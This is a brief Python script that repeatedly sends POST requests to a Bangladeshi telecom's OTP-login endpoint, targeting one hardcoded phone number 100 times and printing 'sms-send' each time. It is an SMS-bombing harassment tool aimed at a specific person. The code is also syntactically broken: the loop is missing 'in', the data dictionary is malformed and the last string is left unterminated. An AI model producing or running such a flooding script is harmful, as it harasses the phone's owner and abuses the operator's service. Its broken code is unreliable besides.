import requests

#post

myblapi='https://assetliteapi.bangladesh.net/api/v1/user/otp-login/request'
data={'mobile":01742246823'}

for i range(100):
	requests.post(myblapi,data=data)
	print(str(i+1)+'sms-send